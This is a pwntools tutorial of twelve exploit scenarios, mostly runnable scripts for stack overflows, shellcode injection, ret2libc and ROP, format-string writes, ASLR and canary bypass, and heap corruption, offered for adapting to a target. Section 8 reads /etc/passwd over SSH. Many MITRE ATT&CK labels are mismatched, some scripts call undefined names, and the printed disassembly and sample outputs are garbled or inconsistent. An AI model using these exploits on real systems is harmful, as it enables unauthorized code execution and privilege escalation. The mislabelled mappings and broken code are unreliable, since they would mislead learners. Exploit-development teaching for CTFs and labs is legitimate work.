# pwntools — Hands-On Use Cases

Each scenario below includes a complete, runnable Python script embedding pwntools. Adapt the binary names, addresses, and payloads to your target.

---

## 1. TCP Socket Connection to Vulnerable Service

**Scenario:** A vulnerable server listens on `localhost:9000`, accepting input and echoing it back. Exploit by sending a crafted payload.

**MITRE ATT&CK:** T1059.004 (Unix Shell - code execution).

```python
#!/usr/bin/env python3
from pwn import *

# Connect to vulnerable service
p = remote("localhost", 9000)

# Receive initial banner (if any)
data = p.recv(1024)
print(f"[*] Received: {data}")

# Send payload (e.g., a command or crash input)
payload = b"A" * 100 + b"\x00"
p.sendline(payload)

# Receive response
response = p.recv(1024)
print(f"[*] Response: {response}")

# Drop to interactive shell
p.interactive()
p.close()
```

**Variants:**
- **SSH transport:** Replace `remote()` with `ssh(host="10.0.0.1", user="user", password="pass").process("./vuln")`.
- **Listen for reverse shell:** Use `listen(4444)` instead of `remote()` if the target connects back to you.

---

## 2. Local Buffer Overflow with Basic Payload

**Scenario:** A setuid binary (`/usr/local/bin/vuln`) has a 64-byte stack buffer. Overflow it with a simple return address overwrite.

**MITRE ATT&CK:** T1548.001 (Abuse Elevation Control Mechanism - setuid/setgid).

```python
#!/usr/bin/env python3
from pwn import *

# Load the binary
elf = ELF("./vuln")
context.binary = elf

# Binary info
print(f"[*] Binary base: {hex(elf.address)}")
print(f"[*] Security: {elf.checksec()}")

# Spawn the process
p = process("./vuln")

# Craft payload: 64 bytes of buffer + return address to injected code or gadget
target_addr = 0x401234  # Address of our shellcode or gadget
payload = b"A" * 64 + p64(target_addr)

# Send payload
p.sendline(payload)

# Interact
p.interactive()
p.close()
```

**Output:**
```
[*] Binary base: 0x401000
[*] Security: Partial RELRO, No canary found, NX disabled, No PIE
```

---

## 3. Shellcode Generation and Injection

**Scenario:** Generate x86-64 Linux shellcode to spawn `/bin/sh`, inject into buffer overflow, and jump to it.

**MITRE ATT&CK:** T1059.004 (Unix Shell), T1598.003 (Phishing - Spearphishing Link - code execution).

```python
#!/usr/bin/env python3
from pwn import *

# Set architecture and OS for shellcode generation
context.arch = 'amd64'
context.os = 'linux'

# Generate shellcode: interactive shell
shellcode = shellcraft.sh()
shellcode_bytes = asm(shellcode)

print(f"[*] Shellcode ({len(shellcode_bytes)} bytes):")
print(disasm(shellcode_bytes))

# Assume vulnerable binary with:
# - 64-byte buffer at rbp - 0x40
# - Shellcode can be placed in buffer (NX disabled)
# - Return address at rbp + 8

shellcode_addr = 0x7ffffffde000  # Address of injected shellcode in memory
buffer_size = 64
overflow = shellcode_bytes + b"\x90" * (buffer_size - len(shellcode_bytes))
return_addr = p64(shellcode_addr)

payload = overflow + return_addr

# Send to binary
p = process("./vuln")
p.sendline(payload)
p.interactive()
p.close()
```

**Output (disassembly):**
```
   0:   b8 3b 00 00 00           mov    eax,0x3b
   5:   48 99                    cqo
   7:   48 bf 2f 62 69 6e 2f  movabs rdi,0x68732f6e6962 2f
   e:   2f 73 68
  11:   57                       push   rdi
  12:   48 89 e7                 mov    rdi,rsp
  ...
```

---

## 4. ELF Analysis for Exploit Development

**Scenario:** Parse a compiled binary to extract symbol addresses, GOT entries, security properties, and identify ROP gadget locations.

**MITRE ATT&CK:** T1005 (Data from Local System - reconnaissance).

```python
#!/usr/bin/env python3
from pwn import *

# Load and analyze binary
elf = ELF("./target")

print("[*] === ELF Analysis ===")
print(f"Entry point: {hex(elf.entry)}")
print(f"Base address: {hex(elf.address)}")

# Function symbols
print(f"\n[*] Function Addresses:")
print(f"  main: {hex(elf.symbols['main'])}")
print(f"  system: {hex(elf.symbols.get('system', 0))}")
print(f"  exit: {hex(elf.symbols.get('exit', 0))}")

# GOT entries (for libc functions)
print(f"\n[*] GOT Entries (dynamically linked functions):")
for func in ['printf', 'puts', 'exit']:
    if func in elf.got:
        print(f"  {func}: {hex(elf.got[func])}")

# PLT (Procedure Linkage Table) for dynamic calls
print(f"\n[*] PLT Entries:")
for func in ['printf', 'exit']:
    if func in elf.plt:
        print(f"  {func}: {hex(elf.plt[func])}")

# Security properties
print(f"\n[*] Security Properties:")
checksec = elf.checksec()
for key, value in checksec.items():
    print(f"  {key}: {value}")

# Search for bytes/strings in binary
print(f"\n[*] String Search:")
flag_addr = elf.search(b"flag{")
if flag_addr:
    print(f"  Found 'flag{{' at: {hex(list(flag_addr)[0])}")
else:
    print(f"  'flag{{' not found")

# List all sections
print(f"\n[*] Sections:")
for section in elf.sections:
    print(f"  {section.name}: {hex(section.header['sh_addr'])}-{hex(section.header['sh_addr'] + section.header['sh_size'])}")
```

**Output:**
```
[*] === ELF Analysis ===
Entry point: 0x401000
Base address: 0x400000

[*] Function Addresses:
  main: 0x401150
  system: 0x0 (not in binary, from libc)
  exit: 0x0

[*] GOT Entries:
  printf: 0x403f80
  puts: 0x403f88

[*] Security Properties:
  Full RELRO: True
  Canary: False
  NX: True
  PIE: False
  FORTIFY: False

[*] String Search:
  Found 'flag{' at: 0x402030
```

---

## 5. Return-to-libc (Ret2libc) Exploit

**Scenario:** Target has NX enabled (shellcode injection blocked). Use ROP to call `system("/bin/sh")` after leaking libc address.

**MITRE ATT&CK:** T1548.001 (Abuse Elevation Control Mechanism), T1059.004 (Unix Shell).

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF("./vuln")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.binary = elf

# Step 1: Leak libc address via information disclosure
# (Assume a printf vulnerability or stack leak)
# For this example, we'll assume we know the offset to a libc address on the stack

p = process("./vuln")

# Trigger leak (adjust %x count based on your stack layout)
p.sendline(b"%17$lx")  # Read 17th qword from stack
leak = p.recvline().strip()
leaked_address = int(leak, 16)

# Assume the leaked address is from libc's read() function
libc_base = leaked_address - libc.symbols['read']
system_addr = libc_base + libc.symbols['system']
bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))

print(f"[*] Leaked address: {hex(leaked_address)}")
print(f"[*] libc base: {hex(libc_base)}")
print(f"[*] system(): {hex(system_addr)}")
print(f"[*] /bin/sh: {hex(bin_sh_addr)}")

# Step 2: Build ROP chain to call system("/bin/sh")
# On x86-64, first argument goes in rdi
pop_rdi = 0x401234  # Example: "pop rdi; ret" gadget (find with ROPgadget or pwntools)

payload = b"A" * 64 + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)

p.sendline(payload)
p.interactive()
p.close()
```

---

## 6. ROP Chain Construction with pwntools

**Scenario:** Automatically find ROP gadgets and build a chain to call `printf(format_string, arg)`.

**MITRE ATT&CK:** T1057 (Process Discovery - via format-string information disclosure).

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF("./target")
context.binary = elf

# Initialize ROP scanner
rop = ROP(elf)

print(f"[*] Available gadgets:")
rop.dump()

# Build a chain: call puts("Hello")
hello_str = 0x402000  # Address of "Hello" string in binary
pop_rdi_ret = rop.find_gadget(['pop rdi', 'ret'])

if pop_rdi_ret:
    print(f"[*] Found 'pop rdi; ret' at {hex(pop_rdi_ret.address)}")
else:
    print(f"[-] Could not find 'pop rdi; ret' gadget")

# Build programmatically
rop.call(elf.symbols['printf'], [hello_str])
chain = rop.chain()

print(f"[*] ROP chain ({len(chain)} bytes):")
print(rop.dump())

payload = b"A" * 64 + chain
print(f"[*] Payload: {hexdump(payload[:128])}")
```

---

## 7. GDB-Assisted Debugging During Development

**Scenario:** Attach GDB to a running exploit to set breakpoints and inspect memory mid-exploitation.

**MITRE ATT&CK:** T1657 (Physical Process Interference - process inspection during testing).

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF("./vuln")
context.binary = elf

# Option 1: Spawn binary with debugger from the start
# p = gdb.debug("./vuln", """
# break main
# continue
# """)

# Option 2: Launch binary, then attach debugger later
p = process("./vuln")

# At this point, binary is running; open a terminal with GDB attached
gdb.attach(p, """
break *main+42
continue
""")

# Send first input
p.sendline(b"A" * 50)

# Program pauses at breakpoint; inspect in GDB terminal
# Then type 'c' (continue) in GDB and the Python script resumes
p.interactive()
p.close()
```

---

## 8. SSH-Based Remote Exploitation

**Scenario:** Exploit a vulnerable binary on a remote host via SSH.

**MITRE ATT&CK:** T1021.004 (Lateral Movement - SSH).

```python
#!/usr/bin/env python3
from pwn import *

# Connect via SSH
s = ssh(host="10.0.0.100", user="attacker", password="password")

# Execute the vulnerable binary
p = s.process("./vuln_app")

# Same exploitation as local
payload = b"A" * 64 + p64(0x7f00deadbeef)
p.sendline(payload)
p.recv()

# Or run a one-off command
cmd_output = s.run(["cat", "/etc/passwd"]).read()
print(cmd_output)

s.close()
```

---

## 9. Format String Exploitation

**Scenario:** Exploit a format-string vulnerability to leak stack data and write to arbitrary memory.

**MITRE ATT&CK:** T1598.003 (Phishing - information disclosure via format string).

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF("./vuln")
context.binary = elf

p = process("./vuln")

# Step 1: Leak stack data to find offsets
# Send format string with %x to dump stack
payload = b"%x %x %x %x %x %x %x %x"
p.sendline(payload)
leak = p.recvline()
print(f"[*] Stack leak: {leak}")

# Step 2: Leak a specific address (e.g., return address)
# The 6th %x is the return address
p.sendline(b"%6$lx")
ret_addr = int(p.recvline().strip(), 16)
print(f"[*] Leaked return address: {hex(ret_addr)}")

# Step 3: Write to memory using %n
# Target: overwrite GOT entry for exit() with a gadget address
got_exit = elf.got['exit']
new_value = 0x401234  # Our gadget

# Craft format string write
# This is complex; pwntools provides fmtstr module for assistance
from pwnlib.fmtstr import FmtStr

fs = FmtStr(lambda x: send_payload_get_output(p, x))
fs.write(got_exit, new_value)
# (FmtStr is a simplified example; real exploitation requires careful offset calculation)

p.close()
```

---

## 10. ASLR Bypass via Information Leak

**Scenario:** ASLR randomizes addresses. Leak one address, calculate others, and build ASLR-proof exploit.

**MITRE ATT&CK:** T1027 (Obfuscated Files or Information - ASLR evasion).

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF("./vuln")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.binary = elf

p = process("./vuln")

# Step 1: Leak any libc address
# Assume puts() is called early and we can read its GOT entry
libc_leak = u64(p.recv(8))
libc_base = libc_leak - libc.symbols['puts']

# Step 2: Calculate all addresses relative to leaked base
system_addr = libc_base + libc.symbols['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

print(f"[*] Leaked puts: {hex(libc_leak)}")
print(f"[*] Calculated libc base: {hex(libc_base)}")
print(f"[*] system(): {hex(system_addr)}")

# Step 3: Build exploit with calculated addresses
# Payload uses leaked values, works even with ASLR
payload = b"A" * 64 + p64(pop_rdi_gadget) + p64(bin_sh) + p64(system_addr)

p.sendline(payload)
p.interactive()
p.close()
```

---

## 11. Stack Canary Leaking and Bypass

**Scenario:** Stack canary protects against overflow. Leak canary value, then overflow while preserving it.

**MITRE ATT&CK:** T1548.001 (Abuse Elevation Control Mechanism - stack protection bypass).

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF("./vuln")
context.binary = elf

# Verify canary protection
print(elf.checksec())

p = process("./vuln")

# Step 1: Leak the canary
# Send input that causes puts() to print the stack
p.sendline(b"leak_canary")
stack_dump = p.recv(1024)

# Parse canary from stack dump (offset depends on binary layout)
# Typically 8 bytes after buffer start
canary = u64(stack_dump[64:72])
print(f"[*] Leaked canary: {hex(canary)}")

# Step 2: Overflow with canary preserved
target_addr = 0x401234  # Our gadget or shellcode
payload = b"A" * 64 + p64(canary) + p64(0) + p64(target_addr)

p.sendline(payload)
p.interactive()
p.close()
```

---

## 12. Heap Exploitation: UAF/Overflow Primitive

**Scenario:** Exploit heap vulnerability (use-after-free or overflow) to corrupt heap metadata and achieve code execution.

**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application - heap exploitation).

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF("./vuln_heap")
context.binary = elf
context.log_level = 'debug'

p = process("./vuln_heap")

# Step 1: Allocate chunks
p.sendline(b"1\n" + b"A" * 256)  # Allocate chunk 1 (256 bytes)
p.sendline(b"1\n" + b"B" * 256)  # Allocate chunk 2

# Step 2: Free chunk 1 (heap address leak)
p.sendline(b"2\n1")  # Free chunk 1
p.recvuntil(b"Freed:")
leaked_heap = u64(p.recv(8))
heap_base = leaked_heap - 0x290  # Offset to heap start (ptmalloc metadata)

print(f"[*] Leaked heap: {hex(leaked_heap)}")
print(f"[*] Heap base: {hex(heap_base)}")

# Step 3: Overflow to corrupt forward pointer
# Overwrite freed chunk's fd pointer to point to __malloc_hook or similar target
malloc_hook_addr = 0x7f0000000000  # libc address (calculate via leak)
overflow_data = b"X" * 256 + p64(malloc_hook_addr)

p.sendline(b"1\n" + overflow_data)

# Step 4: Allocate to trigger hook
p.sendline(b"1\n" + b"CODE_EXECUTION_PAYLOAD")

p.interactive()
p.close()
```

---

## Cross-Exploitation Patterns

### Combining Multiple Modules

```python
#!/usr/bin/env python3
from pwn import *

elf = ELF("./vuln")
context.binary = elf

# Combine shellcraft + ROP + process
shellcode = shellcraft.sh()
sc_bytes = asm(shellcode)

# Find gadget to jump to shellcode
rop = ROP(elf)
# ... (build ROP chain)

# Generate payload
payload = b"A" * offset + rop.chain()

p = process("./vuln")
p.sendline(payload)
p.interactive()
p.close()
```

### Integration with Metasploit

```python
# Generate pwntools payload, feed to Metasploit
shellcode = shellcraft.amd64.linux.sh()
payload_bytes = asm(shellcode)

# Save and feed to msfvenom for encoding
with open("/tmp/pwntools_sc.bin", "wb") as f:
    f.write(payload_bytes)

# Then use msfvenom to encode it for the final exploit
```

